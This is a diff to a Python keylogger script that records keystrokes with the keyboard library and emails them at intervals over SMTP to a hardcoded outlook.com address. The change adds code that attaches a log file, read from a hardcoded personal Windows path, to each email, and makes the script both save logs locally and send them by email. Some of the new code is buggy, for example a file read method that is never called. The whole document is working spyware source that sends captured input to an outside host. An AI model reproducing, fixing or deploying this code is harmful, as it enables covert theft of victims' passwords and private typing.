@@ -1,3 +1,4 @@
+import os
 import keyboard # for keylogs
 import smtplib # for sending email using SMTP protocol (gmail)
 # Timer is to make a method runs after an `interval` amount of time
@@ -5,6 +6,9 @@ from threading import Timer
 from datetime import datetime
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
+from email.mime.base import MIMEBase
+from email import encoders
+from pathlib import Path
 
 SEND_REPORT_EVERY = 60 # in seconds, 60 means 1 minute and so on
 EMAIL_ADDRESS = "keylog404@outlook.com"
@@ -75,6 +79,20 @@ class Keylogger:
         html_part = MIMEText(html, "html")
         msg.attach(text_part)
         msg.attach(html_part)
+        # attach log fileo
+        part = MIMEBase('application', "octet-stream")
+        script_dir = os.path.dirname(__file__) #<-- absolute dir the script is in
+        rel_path = self.filename
+        abs_file_path = os.path.join(script_dir, rel_path)
+        
+        # filePath = os.getcwd() + self.filename
+        # filePath.replace("\\\\",'\\')
+        with open("C:\\Users\\tyfer\\OneDrive\\Documents\\GitHub\\keylogger\\keylog-2023-04-08-150456_2023-04-08-150656.txt", 'rb') as file:
+            part.set_payload(file.read)
+       # encoders.encode_base64(part)
+        part.add_header('Content-Disposition',
+                        'attachment; filename={}'.format(Path(self.filename).name))
+        msg.attach(part)
         # after making the mail, convert back as string message
         return msg.as_string()
 
@@ -102,10 +120,8 @@ class Keylogger:
             self.end_dt = datetime.now()
             # update `self.filename`
             self.update_filename()
-            if self.report_method == "email":
-                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
-            elif self.report_method == "file":
-                self.report_to_file()
+            self.report_to_file()
+            self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
             # if you don't want to print in the console, comment below line
             print(f"[{self.filename}] - {self.log}")
             self.start_dt = datetime.now()
@@ -130,8 +146,8 @@ class Keylogger:
 
 if __name__ == "__main__":
     # if you want a keylogger to send to your email
-    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
+    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
     # if you want a keylogger to record keylogs to a local file 
     # (and then send it using your favorite method)
-    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
+    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
     keylogger.start()
